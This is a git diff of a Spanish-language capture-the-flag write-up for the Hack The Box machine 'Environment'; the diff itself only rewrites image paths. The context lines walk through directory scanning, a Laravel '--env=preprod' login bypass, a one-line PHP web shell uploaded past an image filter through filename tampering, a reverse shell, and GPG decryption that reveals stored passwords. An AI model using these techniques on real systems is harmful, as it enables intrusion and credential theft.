@@ -21,14 +21,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-![[Pasted image 20250504224043.png]]
+![[remote-blog/images/Pasted image 20250504224043.png]]
 
 Tenemos dentro de la maquina un apartado de pagina web
-![[Pasted image 20250504224324.png]]
+![[remote-blog/images/Pasted image 20250504224324.png]]
 
 De la misma manera tenemos un apartado donde podemos poner nuestro correo
 
-![[Pasted image 20250504224353.png]]
+![[remote-blog/images/Pasted image 20250504224353.png]]
 
 Con el comando de gobuster
 `gobuster dir -u http://environment.htb -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt`
@@ -48,7 +48,7 @@ encontramos algunas rutas
 /vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
 ```
 Hay rutas interesantes como el de up y upload
-![[Pasted image 20250504225538.png]]
+![[remote-blog/images/Pasted image 20250504225538.png]]
 Acá podemos obtener la version del php y laravel
 PHP: 8.2.28
 Laravel: 11.30.0
@@ -222,45 +222,45 @@ Recomendaciones:
 
 Una vez hemos puesto lo siguiente al inicio del post
 
-![[Pasted image 20250504232502.png]]
+![[remote-blog/images/Pasted image 20250504232502.png]]
 
 /login?--env=preprod HTTP/1.1
 
 Podremos entrar dentro de la pagina y somos el usuario hish
-![[Pasted image 20250504232527.png]]
+![[remote-blog/images/Pasted image 20250504232527.png]]
 
-![[Pasted image 20250504235451.png]]
+![[remote-blog/images/Pasted image 20250504235451.png]]
 
 <?php system($_REQUEST['cmd']); ?>
 
 ### Entrando dentro de la maquina
-![[Pasted image 20250505214947.png]]
+![[remote-blog/images/Pasted image 20250505214947.png]]
 Dentro del apartado del profile, podemos encontrar una vulnerabilidad de subida de imagen, en este caso queremos capturar la subida del archivo (solo permite jpeg ya que LARAVEL permite esto)
 
 Ponemos a capturar con el Burpsuite dentro del profile al momento de hacer upload y obtenemos lo siguiente
 
-![[Pasted image 20250505220837.png]]
+![[remote-blog/images/Pasted image 20250505220837.png]]
 Podemos ver que hemos capturado el packete de la subida de nuestra imagen y ahora lo que vamos a realizar es poner nuestra rev shell
 
 Por lo que realizamos lo siguiente
 Primero mandamos a nuestro packet dentro del repeater -> esto para ir probando constantemente 
 Luego eliminamos todo lo que tenga que ver con respecto a la imagen (desde la linea 26 para abajo) y la reemplazamos con nuestra propia rev shell
 
-![[Pasted image 20250505221018.png]]
+![[remote-blog/images/Pasted image 20250505221018.png]]
 
 Quedaría algo así y lo más importante es reemplazar el nombre del filename para hacer que nuestra rev shell se sube sin ningun tipo de problema
 Por lo que realizamos un character inyection
 
-![[Pasted image 20250505221110.png]]
+![[remote-blog/images/Pasted image 20250505221110.png]]
 
-![[Pasted image 20250505221120.png]]
+![[remote-blog/images/Pasted image 20250505221120.png]]
 
 Verificamos que está bien puesto el filename y la rev shell y mandamos el paquete, por lo que de la misma manera activamos nuestro listener dentro de nuesta maquina y ya estamos dentro de la maquina siendo usuario www-data
 
-![[Pasted image 20250505221641.png]]
+![[remote-blog/images/Pasted image 20250505221641.png]]
 
 Una vez dentro, buscamos al user
-![[Pasted image 20250505222059.png]]
+![[remote-blog/images/Pasted image 20250505222059.png]]
 para poner la terminal persistente una vez dentro, eso va a ser que no se cierre la sesion tan rapidamente:
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
@@ -286,7 +286,7 @@ una vez realizado eso aparecerá como en la imagen de abajo, pero tambien se pue
 
 `cp -R .gnupg /tmp && GNUPGHOME=/tmp/.gnupg gpg --decrypt backup/keyvault.gpg`
 
-![[Pasted image 20250505233831.png]]
+![[remote-blog/images/Pasted image 20250505233831.png]]
       "hish_ <hish@environment.htb>"
 PAYPAL.COM -> Ihaves0meMon$yhere123
 ENVIRONMENT.HTB -> marineSPm@ster!!
